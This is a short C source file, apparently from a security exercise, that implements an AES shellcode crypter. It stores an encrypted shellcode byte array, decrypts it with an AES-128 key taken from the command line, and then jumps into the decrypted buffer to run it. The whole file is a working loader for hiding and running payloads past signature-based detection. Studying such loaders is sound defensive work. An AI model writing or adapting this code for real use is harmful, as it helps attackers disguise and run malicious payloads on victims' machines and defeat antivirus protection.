/*

    Author : Jeremy Catelain 
    Filename : aes-cryptor.c

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/aes.h>

// GLOBAL VARIABLES
unsigned char encrypted_shellcode[] = \
"\xc3\xf8\x41\x52\xf0\xfc\x42\x13\xb1\x76\x52\x62\xaa\x98\x92\x3e\x99\x74\x26\x4b\x06\x48\x2d\xd7\x56\x33\x96\xc7\xc8\x24\x7a\x6e"; // to modify 

AES_KEY dec_key;
// Initialisation table for the shellcode
unsigned char shellcode[100];

// Shellcode printer
void print_shellcode(unsigned char shellc[]) {
    int len = strlen(shellc);
    for (int i = 0; i < len; i++) {
        printf("\\x%02x", shellc[i]);
    }
}

// Decryption
void decryption(unsigned char *decryption_key, int encrypted_shellcode_len){

    AES_set_decrypt_key(decryption_key, 128, &dec_key);

    // Decyption performed 16 bytes by 16 bytes
    long c = 0;
    while(c < encrypted_shellcode_len){
        AES_decrypt(encrypted_shellcode + c, shellcode + c, &dec_key);
        c += 16;
    }
}

int main(int argc, char* argv[])
{
    
    unsigned char* decryption_key = (unsigned char *)argv[1];
    
    printf("Decryption started...\n");

    int encrypted_shellcode_len = strlen((unsigned char *)encrypted_shellcode);
    printf("Shellcode Length: %d\n", encrypted_shellcode_len);

    decryption(decryption_key, encrypted_shellcode_len);

    int (*ret)() = (int(*)())shellcode;

    ret();

}
    
